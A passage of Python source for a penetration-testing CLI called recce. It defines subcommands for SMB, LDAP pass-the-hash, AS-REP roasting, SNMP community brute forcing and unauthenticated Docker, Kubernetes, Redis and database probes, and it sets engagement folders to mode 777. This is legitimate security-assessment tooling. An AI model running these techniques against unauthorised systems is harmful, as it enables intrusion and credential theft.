    ms.add_argument("--no-run", action="store_true",
                    help="don't execute nxc/impacket; just write the commands (airgapped-safe)")
    ms.add_argument("--no-probe", action="store_true",
                    help="skip the live SQL Browser / TDS pre-login probes")
    ms.add_argument("--no-links", action="store_true",
                    help="don't recursively walk the linked-server graph")
    ms.add_argument("--link-depth", type=int, default=4, metavar="N",
                    help="max linked-server chain depth to walk (default 4)")
    ms.add_argument("-o", "--output-dir", default="engagement")
    ms.add_argument("--title", default="Recce Engagement")
    _add_budget(ms)
    ms.set_defaults(func=cmd_mssql)

    # SMB offensive enumeration + attack surface.
    sm = sub.add_parser("smb",
                        help="SMB: stdlib pre-auth posture (dialect/signing/SMBv1) + "
                             "anonymous/credentialed share enum + writable-share proof")
    sm.add_argument("targets", nargs="*",
                    help="restrict to these IPs / ranges / CIDRs / @file (default: all "
                         "SMB hosts in the datastore)")
    sm.add_argument("-u", "--username",
                    help="your account - runs the authenticated enum and pre-fills every "
                         "command ('CORP\\alice' / 'alice@corp.local' work too)")
    sm.add_argument("-p", "--password", help="password for your account")
    sm.add_argument("-d", "--domain", help="AD domain (e.g. corp.local)")
    sm.add_argument("--dc-ip", help="DC IP to fill into the generated commands")
    sm.add_argument("--prove-write", action="store_true",
                    help="prove a writable share REVERSIBLY (drop a marker file, list "
                         "it, delete it) - nothing is left behind")
    sm.add_argument("--screenshots", action="store_true",
                    help="capture terminal-style PROOF screenshots of executed actions "
                         "(share enum, write-proof) for the walkthrough")
    sm.add_argument("--no-run", action="store_true",
                    help="don't execute nxc/smbclient; just write the commands (airgapped-safe)")
    sm.add_argument("--no-probe", action="store_true",
                    help="skip the live SMB2/SMBv1 negotiate probes")
    sm.add_argument("-o", "--output-dir", default="engagement")
    sm.add_argument("--title", default="Recce Engagement")
    _add_budget(sm)
    sm.set_defaults(func=cmd_smb)

    # FTP offensive enumeration.
    fp = sub.add_parser("ftp",
                        help="FTP: stdlib banner/anonymous/AUTH-TLS probe + known-"
                             "backdoor match + reversible writable-directory proof")
    fp.add_argument("targets", nargs="*",
                    help="restrict to these IPs / ranges / CIDRs / @file (default: all "
                         "FTP hosts in the datastore)")
    fp.add_argument("-u", "--username", help="FTP username (omit to probe anonymous)")
    fp.add_argument("-p", "--password", help="FTP password")
    fp.add_argument("--prove-write", action="store_true",
                    help="prove a writable directory REVERSIBLY (STOR a marker file, "
                         "then DELE it - nothing left behind)")
    fp.add_argument("--screenshots", action="store_true",
                    help="capture terminal-style PROOF screenshots of the write proof")
    fp.add_argument("--no-run", action="store_true",
                    help="don't run the write proof; just write the commands")
    fp.add_argument("--no-probe", action="store_true",
                    help="skip the live banner/anonymous/FEAT probe")
    fp.add_argument("-o", "--output-dir", default="engagement")
    fp.add_argument("--title", default="Recce Engagement")
    _add_budget(fp)
    fp.set_defaults(func=cmd_ftp)

    # Docker Engine API enumeration.
    dk = sub.add_parser("docker",
                        help="Docker: read the Engine API (2375/2376) unauthenticated "
                             "-> CONFIRMED exposed daemon = remote root RCE on the host")
    dk.add_argument("targets", nargs="*",
                    help="restrict to these IPs / ranges / CIDRs / @file (default: all "
                         "Docker hosts in the datastore)")
    dk.add_argument("--screenshots", action="store_true",
                    help="save a terminal-style `docker info` proof screenshot for "
                         "each exposed daemon")
    dk.add_argument("--no-probe", action="store_true",
                    help="skip the live API read; just write the commands")
    dk.add_argument("-o", "--output-dir", default="engagement")
    dk.add_argument("--title", default="Recce Engagement")
    dk.set_defaults(func=cmd_docker)

    # Kubernetes attack-surface enumeration.
    kp = sub.add_parser("kubernetes", aliases=["k8s"],
                        help="Kubernetes: unauthenticated reads of the kubelet "
                             "(10250/10255), kube-apiserver (6443/8443) and etcd (2379)")
    kp.add_argument("targets", nargs="*",
                    help="restrict to these IPs / ranges / CIDRs / @file (default: all "
                         "Kubernetes hosts in the datastore)")
    kp.add_argument("--no-probe", action="store_true",
                    help="skip the live unauthenticated reads; just write the commands")
    kp.add_argument("-o", "--output-dir", default="engagement")
    kp.add_argument("--title", default="Recce Engagement")
    kp.set_defaults(func=cmd_kubernetes)

    # LDAP / AD directory enumeration.
    lp = sub.add_parser("ldap",
                        help="LDAP: anonymously bind + read the RootDSE (domain/forest/"
                             "DC/functional level) and test for anonymous directory read")
    lp.add_argument("targets", nargs="*",
                    help="restrict to these IPs / ranges / CIDRs / @file (default: all "
                         "LDAP hosts in the datastore)")
    lp.add_argument("--screenshots", action="store_true",
                    help="save a terminal-style RootDSE proof screenshot per DC")
    lp.add_argument("--no-probe", action="store_true",
                    help="skip the live bind/read; just write the commands")
    _add_creds(lp)
    lp.add_argument("--hash", metavar="NThash",
                    help="NTLM hash for pass-the-hash (with -u/-d): an NTLM SASL bind "
                         "authenticates the enumeration without the plaintext password; "
                         "on plaintext 389 it is sign+sealed so a signing-required DC "
                         "accepts it (LDAPS 636 needs no sealing)")
    lp.add_argument("-o", "--output-dir", default="engagement")
    lp.add_argument("--title", default="Recce Engagement")
    _add_budget(lp)
    lp.set_defaults(func=cmd_ldap)

    # SNMP enumeration (UDP 161).
    sp = sub.add_parser("snmp",
                        help="SNMP: brute common community strings (UDP 161) and walk "
                             "the system group + Windows users / processes / software")
    sp.add_argument("targets", nargs="*",
                    help="restrict to these IPs / ranges / CIDRs / @file (default: all "
                         "hosts in the datastore - recce probes UDP 161 directly)")
    sp.add_argument("--no-probe", action="store_true",
                    help="skip the live community brute/walk; just write the commands")
    sp.add_argument("-o", "--output-dir", default="engagement")
    sp.add_argument("--title", default="Recce Engagement")
    _add_budget(sp)
    sp.set_defaults(func=cmd_snmp)

    # MongoDB enumeration.
    mp = sub.add_parser("mongodb", aliases=["mongo"],
                        help="MongoDB: unauthenticated wire-protocol probe (27017-19) -> "
                             "CONFIRM listDatabases without auth = critical data exposure")
    mp.add_argument("targets", nargs="*",
                    help="restrict to these IPs / ranges / CIDRs / @file (default: all "
                         "MongoDB hosts in the datastore)")
    mp.add_argument("--no-probe", action="store_true",
                    help="skip the live probe; just write the commands")
    mp.add_argument("-o", "--output-dir", default="engagement")
    mp.add_argument("--title", default="Recce Engagement")
    _add_budget(mp)
    mp.set_defaults(func=cmd_mongodb)

    # Redis enumeration.
    rp = sub.add_parser("redis",
                        help="Redis: unauthenticated RESP probe (6379/6380) -> CONFIRM "
                             "INFO without auth = critical exposure (read/write + RCE)")
    rp.add_argument("targets", nargs="*",
                    help="restrict to these IPs / ranges / CIDRs / @file (default: all "
                         "Redis hosts in the datastore)")
    rp.add_argument("--no-probe", action="store_true",
                    help="skip the live probe; just write the commands")
    rp.add_argument("-o", "--output-dir", default="engagement")
    rp.add_argument("--title", default="Recce Engagement")
    _add_budget(rp)
    rp.set_defaults(func=cmd_redis)

    # Elasticsearch enumeration.
    ep = sub.add_parser("elasticsearch", aliases=["es", "elastic"],
                        help="Elasticsearch: unauthenticated HTTP probe (9200/9201) -> "
                             "CONFIRM /_cat/indices without auth = critical data exposure")
    ep.add_argument("targets", nargs="*",
                    help="restrict to these IPs / ranges / CIDRs / @file (default: all "
                         "Elasticsearch hosts in the datastore)")
    ep.add_argument("--no-probe", action="store_true",
                    help="skip the live probe; just write the commands")
    ep.add_argument("-o", "--output-dir", default="engagement")
    ep.add_argument("--title", default="Recce Engagement")
    _add_budget(ep)
    ep.set_defaults(func=cmd_elasticsearch)

    # rsync-daemon enumeration.
    syp = sub.add_parser("rsync",
                         help="rsync daemon: list modules (873) + prove anonymous "
                              "access = CONFIRMED unauthenticated file exposure")
    syp.add_argument("targets", nargs="*",
                     help="restrict to these IPs / ranges / CIDRs / @file (default: "
                          "all rsync hosts in the datastore)")
    syp.add_argument("--no-probe", action="store_true",
                     help="skip the live probe; just write the commands")
    syp.add_argument("-o", "--output-dir", default="engagement")
    syp.add_argument("--title", default="Recce Engagement")
    _add_budget(syp)
    syp.set_defaults(func=cmd_rsync)

    # NFS / mountd enumeration.
    nfp = sub.add_parser("nfs", aliases=["showmount"],
                         help="NFS: ONC RPC portmapper + mountd export list (showmount "
                              "-e) -> world-mountable export = CONFIRMED exposure")
    nfp.add_argument("targets", nargs="*",
                     help="restrict to these IPs / ranges / CIDRs / @file (default: "
                          "all NFS hosts in the datastore)")
    nfp.add_argument("--no-probe", action="store_true",
                     help="skip the live probe; just write the commands")
    nfp.add_argument("-o", "--output-dir", default="engagement")
    nfp.add_argument("--title", default="Recce Engagement")
    _add_budget(nfp)
    nfp.set_defaults(func=cmd_nfs)

    # Credential-less Kerberos AS-REP roasting + user enumeration.
    kp = sub.add_parser("kerberos", aliases=["asrep", "asreproast"],
                        help="credential-less AD roasting: AS-REP roast pre-auth-disabled "
                             "accounts + validate usernames via the KDC (no creds, port 88)")
    kp.add_argument("targets", nargs="*",
                    help="restrict to these IPs / ranges / CIDRs / @file")
    kp.add_argument("--dc-ip", dest="dc_ip", default="",
                    help="domain controller IP (default: a host with port 88 open)")
    kp.add_argument("-d", "--domain", default="",
                    help="Kerberos realm / AD domain (e.g. CORP.LOCAL)")
    kp.add_argument("--userlist",
                    help="file of candidate usernames, one per line (default: the "
                         "user accounts recce already enumerated)")
    kp.add_argument("--user", action="append",
                    help="test a single username (repeatable)")
    kp.add_argument("--no-probe", action="store_true",
                    help="skip the live probe; just write the commands")
    kp.add_argument("-o", "--output-dir", default="engagement")
    kp.add_argument("--title", default="Recce Engagement")
    _add_budget(kp)
    kp.set_defaults(func=cmd_kerberos)

    sk = sub.add_parser("fieldkit-export",
                        help="export the engagement as a seed for the fieldkit "
                             "exploitation kit (gnmap + bridge JSON + attack plan)")
    sk.add_argument("targets", nargs="*",
                    help="restrict to these IPs / ranges / CIDRs / @file (default: all)")
    sk.add_argument("-o", "--output-dir", default="engagement")
    sk.add_argument("--title", default="Recce Engagement")
    sk.set_defaults(func=cmd_fieldkit_export)

    ski = sub.add_parser("fieldkit-import",
                         help="fold a fieldkit findings.json (proven exploitation) back "
                              "into the workbook + report")
    ski.add_argument("findings", help="path to a fieldkit findings.json or recce_findings.json")
    ski.add_argument("-o", "--output-dir", default="engagement")
    ski.add_argument("--title", default="Recce Engagement")
    ski.set_defaults(func=cmd_fieldkit_import)

    # Pre-rename spellings (the kit was called Sköll) - hidden from --help, still functional.
    # (no `help=` at all: argparse only lists a subcommand when the kwarg is present,
    #  and it prints `help=SUPPRESS` literally rather than honouring it.)
    sk_old = sub.add_parser("skoll-export")
    sk_old.add_argument("targets", nargs="*")
    sk_old.add_argument("-o", "--output-dir", default="engagement")
    sk_old.add_argument("--title", default="Recce Engagement")
    sk_old.set_defaults(func=_deprecated_alias(cmd_fieldkit_export,
                                               "skoll-export", "fieldkit-export"))

    ski_old = sub.add_parser("skoll-import")
    ski_old.add_argument("findings")
    ski_old.add_argument("-o", "--output-dir", default="engagement")
    ski_old.add_argument("--title", default="Recce Engagement")
    ski_old.set_defaults(func=_deprecated_alias(cmd_fieldkit_import,
                                                "skoll-import", "fieldkit-import"))

    r = sub.add_parser("report", help="regenerate reports (preserves tracking)")
    r.add_argument("-o", "--output-dir", default="engagement")
    r.add_argument("--title", default="Recce Engagement")
    r.add_argument("--min-qod", type=int, default=None, metavar="N",
                   help="hide findings below this Quality-of-Detection score (0-100; "
                        "70 hides banner/version leads, 95 shows only verified). "
                        "Persists; --min-qod 0 shows all again.")
    r.set_defaults(func=cmd_report)

    st = sub.add_parser("status", help="print live review coverage")
    st.add_argument("-o", "--output-dir", default="engagement")
    st.set_defaults(func=cmd_status)

    ax = sub.add_parser("access",
                        help="record / review initial access (footholds) per host - "
                             "auto-derived from credentialed enum, or record your own")
    ax.add_argument("targets", nargs="*",
                    help="restrict the listing to these IPs / ranges / CIDRs / @file")
    ax.add_argument("-o", "--output-dir", default="engagement")
    ax.add_argument("--title", default="Recce Engagement")
    ax.add_argument("--host", nargs="*",
                    help="record a foothold on this IP (or --undo to clear it)")
    ax.add_argument("--note", help="how access was gained (shown in the report)")
    ax.add_argument("--undo", action="store_true",
                    help="with --host, clear the recorded foothold")
    ax.set_defaults(func=cmd_access)

    rv = sub.add_parser("review", help="mark items reviewed / not reviewed")
    rv.add_argument("-o", "--output-dir", default="engagement")
    rv.add_argument("--title", default="Recce Engagement")
    rv.add_argument("--host", nargs="*", help="host IP(s) to mark")
    rv.add_argument("--service", nargs="*", metavar="IP:PORT", help="service(s) to mark")
    rv.add_argument("--key", nargs="*", help="raw tracking key(s) to mark")
    rv.add_argument("--cascade", action="store_true",
                    help="with --host, also mark that host's services")
    rv.add_argument("--note", help="attach a note to the marked items")
    rv.add_argument("--undo", action="store_true", help="un-review instead of review")
    rv.set_defaults(func=cmd_review)

    d = sub.add_parser("demo", help="build reports from bundled sample scan (offline)")
    d.add_argument("-o", "--output-dir", default="demo_engagement")
    d.set_defaults(func=cmd_demo)

    doc = sub.add_parser("doctor", help="check this box can run the tool (env + tools + self-scan)")
    doc.add_argument("--no-self-scan", action="store_true",
                     help="skip the real localhost self-scan")
    doc.set_defaults(func=cmd_doctor)
    return p


_QUICKSTART = r"""
recce - phased enumeration & reporting. New to this? Open QUICKSTART.md for a
plain-English, step-by-step walkthrough. The core loop is short:

  1.  recce doctor                       check this box can run everything
  2.  recce enum  <targets> -o eng        find hosts, ports, services -> workbook
  3.  recce vulns -o eng                   vuln-scan what enum found
  4.  recce sweep -o eng                   ALL credential-free deep modules at once
                                          (web/smb/ftp/ldap/snmp/mongodb/redis/
                                          elasticsearch/rsync/nfs/kerberos/docker/k8s/mssql)
  5.  recce credsweep -u USER -p PASS -d DOMAIN -o eng
                                          ALL authenticated modules once you have creds
                                          (credenum + authenticated ldap/smb/mssql/ftp)

Then open eng/enumeration.xlsx (the "Runbook" tab lists every command + options),
or check progress and the suggested next step:  recce status -o eng

Want to focus one service instead of the whole sweep?  Each still has its own
command - recce web|smb|ftp|ldap|snmp|mongodb|redis|elasticsearch|rsync|nfs|
kerberos|docker|k8s|mssql -o eng  (or add -u/-p/-d to smb/ldap/mssql/ftp for their
authenticated depth). See the Runbook tab.

Already have an nmap scan?   recce import scan.xml -o eng   (no scanning)
SharpHound / Certipy data?   recce ad loot.zip certipy.json -u USER -p PASS -d DOMAIN
                             (AD vulns + ESC findings + paths to Domain Admin)
Have a complete IP/hostname list?  recce enum @scope.txt --targets-up
                             (lines: 'IP hostname'; pre-seeds every host so a
                             timeout never drops a real target from the report)

Targets: a single IP, several IPs, a range (10.0.0.10-40), a CIDR, or @file.
Hosts blocking ping (firewalled / Windows / AD)?  add  -Pn  to enum/scan.
Run scans with sudo for SYN + OS detection.  `recce <command> -h` for options.
"""


def _print_quickstart() -> int:
    print(BANNER)
    print(_QUICKSTART)
    return 0


def main(argv: list[str] | None = None) -> int:
    args = build_arg_parser().parse_args(argv)
    if getattr(args, "command", None) is None:
        # Bare `recce` (no subcommand): a friendly quickstart beats an argparse error.
        return _print_quickstart()
    try:
        return args.func(args)
    except KeyboardInterrupt:
        # A scan phase catches this internally to save partial results; this is the
        # backstop for any command that doesn't, so Ctrl-C is never an ugly crash.
        print("\n[!] Interrupted. Results collected so far were saved; re-run "
              "(with --resume on a scan) to continue.")
        return 130
    except Exception as e:  # noqa: BLE001 - top-level safety net for field use
        # Never dump a raw traceback at a tester mid-engagement. Per-host scan work
        # is already persisted crash-safe, so their data survives; give a clean
        # message and a way to get the details for a bug report.
        print(f"\n[x] recce hit an unexpected error: {type(e).__name__}: {e}")
        if os.environ.get("RECCE_DEBUG"):
            import traceback
            traceback.print_exc()
        else:
            print("    Any data collected so far is saved. Re-run to continue; "
                  "set RECCE_DEBUG=1 to see the full traceback for a bug report.")
        return 1
    finally:
        # Relax the engagement folder to 777 on every exit path (success, Ctrl-C,
        # or crash) so a sudo run never leaves the operator locked out of outputs.
        out_dir = getattr(args, "output_dir", None)
        if out_dir:
            _relax_perms(out_dir)
